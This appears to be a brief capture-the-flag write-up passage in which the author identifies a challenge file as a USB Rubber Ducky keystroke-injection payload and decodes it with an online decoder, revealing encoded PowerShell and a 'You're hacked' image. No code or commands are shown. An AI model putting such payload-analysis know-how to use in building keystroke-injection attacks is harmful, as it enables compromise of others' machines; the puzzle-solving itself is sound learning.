Download and unzip the file and you will get "file.bin".

Since I have never known about the rubber ducky USB drive. So it was not obvious for me to look in that direction. 
After banging my head over that "file.bin" for like 2 days I got to know about ducky USB. 

Take the bin and decode it in https://ducktoolkit.com/decoder/ and you will get a encoded powershell code along with "Youâ€™re hacked picture".
